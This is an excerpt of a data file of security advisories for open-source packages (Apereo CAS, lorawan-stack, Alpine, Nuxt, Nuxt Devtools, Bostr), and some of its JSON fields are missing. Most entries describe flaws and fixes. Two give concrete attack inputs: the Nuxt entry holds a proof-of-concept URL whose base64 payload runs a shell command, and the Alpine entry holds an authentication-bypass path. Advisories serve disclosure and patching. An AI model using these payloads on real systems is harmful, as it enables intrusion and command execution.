            "details": "<b>Apereo CAS vulnerable to credential leaks for LDAP authentication</b><br>Apereo CAS is an open source multilingual single sign-on solution for the web. Apereo CAS can be configured to use authentication based on client X509 certificates. These certificates can be provided via TLS handshake or a special HTTP header, such as \u201cssl_client_cert\u201d. When checking the validity of the provided client certificate, X509CredentialsAuthenticationHandler performs check that this certificate is not revoked. To do so, it fetches URLs provided in the \u201cCRL Distribution Points\u201d extension of the certificate, which are taken from the certificate itself and therefore can be controlled by a malicious user. If the CAS server is configured to use an LDAP server for x509 authentication with a password, for example by setting a \u201ccas.authn.x509.ldap.ldap-url\u201d and \u201ccas.authn.x509.ldap.bind-credential\u201d properties, X509CredentialsAuthenticationHandler fetches revocation URLs from the certificate, which can be LDAP urls. When making requests to this LDAP urls, Apereo CAS uses the same password as for initially configured LDAP server, which can lead to a password leak. An unauthenticated user can leak the password used to LDAP connection configured on server. This issue has been addressed in version 6.6.6. Users are advised to upgrade. There are no known workarounds for this vulnerability.",

            "details": "<b>lorawan-stack Open Redirect vulnerability</b><br>lorawan-stack is an open source LoRaWAN network server. Prior to version 3.24.1, an open redirect exists on the login page of the lorawan stack server, allowing an attacker to supply a user controlled redirect upon sign in. This issue may allows malicious actors to phish users, as users assume they were redirected to the homepage on login. Version 3.24.1 contains a fix.\n\n",

            "details": "<b>Alpine allows Authentication Filter bypass</b><br>Alpine is a scaffolding library in Java. Alpine prior to version 1.10.4 allows Authentication Filter bypass. The AuthenticationFilter relies on the request URI to evaluate if the user is accessing the swagger endpoint. By accessing a URL with a path such as &#x2F;api&#x2F;foo;%2fapi%2fswagger the contains condition will hold and will return from the authentication filter without aborting the request. Note that the principal object will not be assigned and therefore the issue wont allow user impersonation. This issue has been fixed in version 1.10.4. There are no known workarounds.",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/stevespringett/Alpine'>https://github.com/stevespringett/Alpine</a></li><li>- <a target='_blank' href='https://github.com/stevespringett/Alpine/blob/f03dbda46229c26145a5f9f7f2660cc2c386be02/alpine/src/main/java/alpine/filters/AuthenticationFilter.java#L58-L60'>https://github.com/stevespringett/Alpine/blob/f03dbda46229c26145a5f9f7f2660cc2c386be02/alpine/src/main/java/alpine/filters/AuthenticationFilter.java#L58-L60</a></li><li>- <a target='_blank' href='https://github.com/stevespringett/Alpine/releases/tag/alpine-parent-1.10.4'>https://github.com/stevespringett/Alpine/releases/tag/alpine-parent-1.10.4</a></li><li>- <a target='_blank' href='https://securitylab.github.com/advisories'>https://securitylab.github.com/advisories</a></li></ul>"

            "ecosystem": "npm",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-v784-fjjh-f8r4' target='_blank'>GHSA-v784-fjjh-f8r4</a>",
            "details": "<b>Nuxt vulnerable to remote code execution via the browser when running the test locally</b><br>### Summary\nDue to the insufficient validation of the `path` parameter in the NuxtTestComponentWrapper, an attacker can execute arbitrary JavaScript on the server side, which allows them to execute arbitrary commands.\n\n### Details\nWhile running the test, a special component named `NuxtTestComponentWrapper` is available.\nhttps:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;nuxt&#x2F;blob&#x2F;4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec&#x2F;packages&#x2F;nuxt&#x2F;src&#x2F;app&#x2F;components&#x2F;nuxt-root.vue#L42-L43\n\nThis component loads the specified path as a component and renders it.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;nuxt&#x2F;blob&#x2F;4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec&#x2F;packages&#x2F;nuxt&#x2F;src&#x2F;app&#x2F;components&#x2F;test-component-wrapper.ts#L9-L27\n\nThere is a validation for the `path` parameter to check whether the path traversal is performed, but this check is not sufficient.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;nuxt&#x2F;blob&#x2F;4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec&#x2F;packages&#x2F;nuxt&#x2F;src&#x2F;app&#x2F;components&#x2F;test-component-wrapper.ts#L15-L19\n\nSince `import(...)` uses `query.path` instead of the normalized `path`, a non-normalized URL can reach the `import(...)` function.\nFor example, passing something like `.&#x2F;components&#x2F;test` normalizes `path` to `&#x2F;root&#x2F;directory&#x2F;components&#x2F;test`, but `import(...)` still receives `.&#x2F;components&#x2F;test`.\n\nBy using this behavior, it&#x27;s possible to load arbitrary JavaScript by using the path like the following:\n```\ndata:text&#x2F;javascript;base64,Y29uc29sZS5sb2coMSk\n```\n\nSince `resolve(...)` resolves the filesystem path, not the URI, the above URI is treated as a relative path, but `import(...)` sees it as an absolute URI, and loads it as a JavaScript.\n\n### PoC\n1. Create a nuxt project and run it in the test mode:\n```\nnpx nuxi@latest init test\ncd test\nTEST=true npm run dev\n```\n2. Open the following URL:\n```\nhttp:&#x2F;&#x2F;localhost:3000&#x2F;__nuxt_component_test__&#x2F;?path=data%3Atext%2Fjavascript%3Bbase64%2CKGF3YWl0IGltcG9ydCgnZnMnKSkud3JpdGVGaWxlU3luYygnL3RtcC90ZXN0JywgKGF3YWl0IGltcG9ydCgnY2hpbGRfcHJvY2VzcycpKS5zcGF3blN5bmMoIndob2FtaSIpLnN0ZG91dCwgJ3V0Zi04Jyk\n```\n3. Confirm that the output of `whoami` is written to `&#x2F;tmp&#x2F;test`\n\nDemonstration video: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FI6mN8WbcE4\n\n### Impact\nUsers who open a malicious web page in the browser while running the test locally are affected by this vulnerability, which results in the remote code execution from the malicious web page.\nSince web pages can send requests to arbitrary addresses, a malicious web page can repeatedly try to exploit this vulnerability, which then triggers the exploit when the test server starts.",

            "langs": "ts",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/security/advisories/GHSA-v784-fjjh-f8r4'>https://github.com/nuxt/nuxt/security/advisories/GHSA-v784-fjjh-f8r4</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt'>https://github.com/nuxt/nuxt</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L15-L19'>https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L15-L19</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L9-L27'>https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L9-L27</a></li></ul>"
        }, {
            "ecosystem": "npm",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-rcvg-rgf7-pppv' target='_blank'>GHSA-rcvg-rgf7-pppv</a>",
            "details": "<b>Nuxt Devtools has a Path Traversal: &#x27;..&#x2F;filedir&#x27;</b><br>### Summary\nNuxt Devtools is missing authentication on the `getTextAssetContent` RPC function which is vulnerable to path traversal.  Combined with a lack of Origin checks on the WebSocket handler,  an attacker is able to interact with a locally running devtools instance and exfiltrate data abusing this vulnerability. \n\nIn certain configurations an attacker could leak the devtools authentication token and then abuse other RPC functions to achieve RCE. \n\n### Details\nThe `getTextAssetContent` function does not check for path traversals [(source)](https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;devtools&#x2F;blob&#x2F;c4f2b68281203fc3f61ffc97d9c6623fbfde46bb&#x2F;packages&#x2F;devtools&#x2F;src&#x2F;server-rpc&#x2F;assets.ts#L88C48-L88C48), this could allow an attacker to read arbitrary files over the RPC WebSocket. \n\nThe WebSocket server does not check the origin of the request [(source)](https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;devtools&#x2F;blob&#x2F;c4f2b68281203fc3f61ffc97d9c6623fbfde46bb&#x2F;packages&#x2F;devtools&#x2F;src&#x2F;server-rpc&#x2F;index.ts#L109) leading to [CSWSH](https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;websockets&#x2F;cross-site-websocket-hijacking). This may be intentional to allow certain configurations to work correctly.\n\nNuxt Devtools authentication tokens are placed within the home directory of the current user  [(source)](https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;devtools&#x2F;blob&#x2F;c4f2b68281203fc3f61ffc97d9c6623fbfde46bb&#x2F;packages&#x2F;devtools&#x2F;src&#x2F;dev-auth.ts#L14).\n\nIn the scenario that:\n + The user has a Nuxt3 Project running\n + Devtools is enabled and running\n + The project is placed within the users home directory.\n + The user visits a malicious webpage\n + User has authenticated with devtools at least once\n\nThe malicious webpage can connect to the Devtools WebSocket, perform a directory traversal brute force to find the authentication token, then use the *authenticated* [`writeStaticAssets` function](https:&#x2F;&#x2F;github.com&#x2F;nuxt&#x2F;devtools&#x2F;blob&#x2F;c4f2b68281203fc3f61ffc97d9c6623fbfde46bb&#x2F;packages&#x2F;devtools&#x2F;src&#x2F;server-rpc&#x2F;assets.ts#L96C11-L96C28) to create a new Component, Nitro Handler or `app.vue` file which will run automatically as the file is changed.\n\n### PoC\nPOC will exploit the Devtools server on localhost:3000 (you may need to manually restart the server as the restart hook does not always work).\n\nPOC: https:&#x2F;&#x2F;devtools-exploit.pages.dev\n\n1. Create a new project with nuxt.new.\n2. Place the project inside your home directory.\n3. Run `pnpm run dev`.\n4. Open the POC page.\n\nThe POC will:\n+ Identify devtools version.\n+ Leak your devtools token.\n+ Create a new server handler with an insecure eval.\n\n### Impact\n+ All new Nuxt projects by default (devtools is enabled) are vulnerable to arbitrary file read.\n+ Certain Nuxt configurations are vulnerable to Remote Code Execution\n",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/nuxt/nuxt/security/advisories/GHSA-rcvg-rgf7-pppv'>https://github.com/nuxt/nuxt/security/advisories/GHSA-rcvg-rgf7-pppv</a></li><li>- <a target='_blank' href='https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/dev-auth.ts#L14'>https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/dev-auth.ts#L14</a></li><li>- <a target='_blank' href='https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/assets.ts#L88C48-L88C48'>https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/assets.ts#L88C48-L88C48</a></li><li>- <a target='_blank' href='https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/assets.ts#L96C11-L96C28'>https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/assets.ts#L96C11-L96C28</a></li><li>- <a target='_blank' href='https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/index.ts#L109'>https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/index.ts#L109</a></li><li>- <a target='_blank' href='https://github.com/nuxt/nuxt'>https://github.com/nuxt/nuxt</a></li><li>- <a target='_blank' href='https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking'>https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking</a></li></ul>"

            "details": "<b>Bostr Improper Authorization vulnerability</b><br>Even with `authorized_keys` is filled with allowed pubkeys, If `noscraper` is enabled, It will allow anyone to use bouncer even it&#x27;s pubkey is not in `authorized_keys`.\n\n### Impact\n- Private bouncer\n\n### Patches\nAvailable on version [3.0.10](https:&#x2F;&#x2F;github.com&#x2F;Yonle&#x2F;bostr&#x2F;releases&#x2F;tag&#x2F;3.0.10)\n\n### Workarounds\nDisable `noscraper` if you have `authorized_keys` being set in config\n\n### References\nThis [line of code](https:&#x2F;&#x2F;github.com&#x2F;Yonle&#x2F;bostr&#x2F;blob&#x2F;8665374a66e2afb9f92d0414b0d6f420a95d5d2d&#x2F;auth.js#L21) is the cause.",
